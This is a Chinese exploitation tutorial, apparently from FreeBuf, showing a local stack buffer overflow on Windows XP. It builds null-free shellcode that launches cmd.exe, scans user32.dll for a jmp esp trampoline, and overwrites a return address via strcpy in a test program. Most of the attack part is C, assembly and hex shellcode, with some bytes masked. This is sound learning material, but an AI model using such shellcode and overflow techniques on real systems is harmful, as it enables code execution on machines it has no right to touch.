@@ -1,0 +1,275 @@
+##  0x00 工具
+
+> 基础汇编知识
+>
+> Windows xp下的VC++6.0
+>
+> 注意力集中的你
+>
+> 勤劳的双手
+
+##  0x01 前言
+
+ **在经过一系列的汇编基础训练之后，决定将此次任务目标上升几个档次，（开始奔向pwn一系列的学习）所以这只是一个开端。**
+
+前景回忆与复习，本地缓冲区溢出关键在于我们调用函数后的返回地址可以被我们用任意地址覆盖，那么我们就可以让计算机执行那个地址的代码，而那串代码所在的是我今天精心构造的一个能弹出Dos窗口的shellcode。
+
+那么问题来了，有时候我们的程序执行环境或者平台不同，shellcode的地址就可能会改变，所以怎么准确执行shellcode，换句话说，怎么动态定位shellcode的地址就成了我今天要介绍的主题？
+
+经过一度搜索与提示，我们可以用系统核心dll里的指令jmp esp来完成跳转！据说，这一技巧很灵验和通用。（迫不及待试一试！）
+
+百度百科了一下：Windows的系统核心dll包括kernel32.dll、use***.dll、gdi32.dll。这些dll—直位于内存中，而且对应于固定的版本，Windows加载的位置是固定的。
+
+因此，接下来我们就要找出jmp esp作为跳板从而动态定位shellcode。
+
+##  0x02 原理
+
+主角：ESP。当函数执行ret指令返回后，EIP指针就会发生跳转，跳转到返回地址，此时ESP就会指向返回地址的下一个位置。
+
+执行ret之前：
+
+![](https://image.3001.net/images/20200419/1587298202_5e9c3f9ade320.png!small)执行ret之后：
+
+![](https://image.3001.net/images/20200419/1587298230_5e9c3fb6338f8.png!small)
+
+可以看见函数ret后，ESP总是指向返回地址之后的位置，那么大胆猜想，如果我们在缓冲区溢出漏洞利用的时候，返回地址覆盖为jmp
+ESP，而shellcode所在位置刚好就是此时ESP所指向的地方，那岂不是妙哉！
+
+##  0x03 实战
+
+总之，纸上谈兵不好用，还是先来个实践吧！
+
+首先，写出一个弹出Dos窗口C语言程序：
+
+    
+    
+    #include "windows.h"
+    int main(int argc, char* argv[])
+    {
+            HINSTANCE libHandle;
+            char *dll="use***.dll";
+            libHandle=LoadLibrary(dll);
+    	WinExec("cmd.exe",5);
+    	ExitProcess(0);
+    	return 0;
+    }
+
+进入汇编模式，写出重点汇编代码：
+
+![](https://image.3001.net/images/20200419/1587298287_5e9c3fef69fc4.png!small)但是我根据自己的理解习惯改写了汇编：
+
+    
+    
+    #include "windows.h"
+    int main(int argc, char* argv[])
+    {
+            HINSTANCE libHandle;
+            char *dll="use***.dll";
+            libHandle=LoadLibrary(dll);
+    	//WinExec("cmd.exe",5);
+    	//ExitProcess(0);
+    	__asm
+            {
+    		push ebp
+    		mov ebp,esp
+     
+    		sub esp,48h
+    		xor eax,eax  //eax清0
+    		push eax     //“0x00”，用于分割字符串
+    		mov eax,0x6578652e   //".exe"的十六进制
+    		push eax
+    		mov eax,0x646d63   //"cmd"的十六进制
+    		push eax
+    		mov eax,esp
+    		push 5
+    		push eax
+    		mov eax,0x7C8623AD
+    		call eax
+    		cmp esi,esp
+    		xor ebx,ebx
+    		push ebx
+    		mov ebx,0x7C81CAFA
+    		call ebx 
+     
+    		mov esp,ebp
+    		pop ebp
+    	}
+    	return 0;
+    }
+
+调试模式，反汇编提取机器码：
+
+![](https://image.3001.net/images/20200419/1587298466_5e9c40a2150b7.png!small)
+
+如下：
+
+\x55\x8B\xEC\x83\xEC\x48\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x6D\x64\x00\x50\x8B\x**\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x3B\xF4\x33\xDB\x53\xBB\xFA\xCA\x81\x7C\xFF\xD3\x8B\xE5\x5D
+
+然后：
+
+![](https://image.3001.net/images/20200419/1587298485_5e9c40b5f1c56.png!small)
+
+可是我们发现其中有个\x00。
+
+这里补充一下，对于shellcode，我们是不能出现这种阶段字符的，因为有些函数（如strcpy）是以\x00作为字符串的结尾，这样shellcode就会执行不成功。
+
+那么问题来了，怎么解决这个\x00呢？
+
+最经典的方法就是对shellcode进行编码。不过，理解此种技术还是需要单独写一篇文章介绍。本篇文章就用了另外一种方法：
+
+我们可以考虑为什么出现这种原因？出现这种原因是压栈时字符串长度不够，就只能用00来填充了，
+
+参考下面：（我记不得这张图片来自哪个参考链接了）
+
+![](https://image.3001.net/images/20200419/1587298508_5e9c40cca39c6.png!small)
+
+原理就是，将不齐的字符串补齐，用什么补齐呢？这里用的是“?”，为了不影响原本意义，补齐之后还要再用栈操作把“?”替换为“0”
+
+现在就是：
+
+    
+    
+    #include "windows.h"
+    //char shellcode[]="\x55\x8B\xEC\x83\xEC\x48\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x6D\x64\x00\x50\x8B\x**\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x3B\xF4\x33\xDB\x53\xBB\xFA\xCA\x81\x7C\xFF\xD3\x8B\xE5\x5D";
+    int main(int argc, char* argv[])
+    {
+            HINSTANCE libHandle;
+    	char *dll="use***.dll";
+            libHandle=LoadLibrary(dll);
+    	//WinExec("cmd.exe",5);
+    	//ExitProcess(0);
+    	__asm
+            {
+    		push ebp
+    		mov ebp,esp
+     
+    		xor eax,eax  //eax清0
+     
+    		push 0x3f657865   //"exe?"的十六进制
+    		push 0x2e646d63   //"cmd."的十六进制
+    		mov [esp+7],eax   //把"?"换成0
+    		mov ebx,esp		  //cmd.exe的地址
+    		push ebx
+    		mov ebx,0x7C8623AD
+    		call ebx
+     
+    		xor ebx,ebx
+    		push ebx
+    		mov ebx,0x7C81CAFA
+    		call ebx 
+     
+    		mov esp,ebp
+    		pop ebp
+    	}
+    	return 0;
+    }
+
+从上面图可以知道，没有出现00，并且可以执行成功！这个时候就可以把shellcode提取出来！接下来，我们再提取机器码：
+
+    
+    
+    #include "windows.h"
+    //char shellcode[]="\x55\x8B\xEC\x83\xEC\x48\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x6D\x64\x00\x50\x8B\x**\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x3B\xF4\x33\xDB\x53\xBB\xFA\xCA\x81\x7C\xFF\xD3\x8B\xE5\x5D";
+    char shellcode[]="\x55\x8B\xEC\x33\xC0\x68\x65\x78\x65\x3F\x68\x63\x6D\x64\x2E\x89\x44\x24\x07\x8B\xDC\x53\xBB\xAD\x23\x86\x7C\xFF\xD3\x33\xDB\x53\xBB\xFA\xCA\x81\x7C\xFF\xD3\x8B\xE5\x5D";
+    int main(int argc, char* argv[])
+    {
+            HINSTANCE libHandle;
+    	char *dll="use***.dll";
+            libHandle=LoadLibrary(dll);
+    	__asm
+    	{
+    		lea eax,shellcode
+    		push eax
+    		ret
+    	}
+    	return 0;
+    }
+
+可以看到，两个shellcode长度有差距！shellcode还缩小了。（shellcode越短越好）
+
+接下来就是找找jmp esp的位置了，这里又是一个难点与关键点,我在这里卡了好久！！！我不会找，只能百度：
+
+    
+    
+    #include "stdafx.h"
+    #include<windows.h>
+    #include<iostream.h>
+    #include<tchar.h>
+    int main()
+    {
+    	int nRetCode=0;
+    	bool we_load_it=false;
+    	HINSTANCE h;
+    	TCHAR dllname[]=_T("use***");       
+    	h=GetModuleHandle(dllname);
+    	if(h==NULL)
+    	{
+    		h=LoadLibrary(dllname);
+    		if(h==NULL)
+    		{		
+    			cout<<"ERROR LOADING DLL:"<<dllname<<endl;
+    			return 1;
+    		}
+    		we_load_it=true;
+    	}
+    	BYTE* ptr=(BYTE*)h;
+    	bool done=false;
+    	for(int y=0;!done;y++)
+    	{
+    		try
+    		{
+    			if(ptr[y]==0xFF&&ptr[y+1]==0xE4)
+    			{
+    				int pos=(int)ptr+y;
+    				cout<<"OPCODE found at 0x"<<hex<<pos<<endl;
+    			}
+    		}
+    		catch(...)
+    		{
+    			cout<<"END OF"<<dllname<<"MEMORY REACHED"<<endl;
+    			done=true;
+    		}
+    	}
+    	if(we_load_it)
+    	FreeLibrary(h);
+    	return nRetCode;
+    }
+
+难道这些都是吗？还是要一个一个试？
+
+![](https://image.3001.net/images/20200419/1587298681_5e9c4179422eb.png!small)
+
+    
+    
+    #include "stdafx.h"
+    #include <stdio.h>
+    #include <string.h>
+    #include <windows.h>
+    char shellcode[]=
+    "\x41\x41\x41\x41"  //str[0]~str[3]
+    "\x41\x41\x41\x41"  //str[4]~str[7]
+    "\x41\x41\x41\x41"	//覆盖ebp
+    "\x7c\x3c\xd9\x77"	//esp的地址覆盖eip地址"\x78\x3c\xd9\x77"	
+    "\x55\x8B\xEC\x33\xC0\x68\x65\x78\x65\x3F\x68\x63\x6D\x64\x2E\x89\x44\x24\x07\x8B\xDC\x53\xBB\xAD\x23\x86\x7C\xFF\xD3\x33\xDB\x53\xBB\xFA\xCA\x81\x7C\xFF\xD3\x8B\xE5\x5D";  //shellcode
+    int main()
+    {
+            HINSTANCE libHandle;
+    	char *dll="use***.dll";
+            libHandle=LoadLibrary(dll);
+    	char str[8];
+    	strcpy(str,shellcode);
+    	for(int i=0; i<8 && str[i]; i++)
+    	{
+    		printf("\\0x%x", str[i]);
+    	}
+    	return 0;
+    }
+
+至此，我们就实现了本地缓冲区简单溢出。
+
+（如若文章有错误）
+
+参考链接：<https://blog.csdn.net/qq_41683305/article/details/104303554>
+
+ ***本文作者：wwwhxy，转载请注明来自FreeBuf.COM**
+
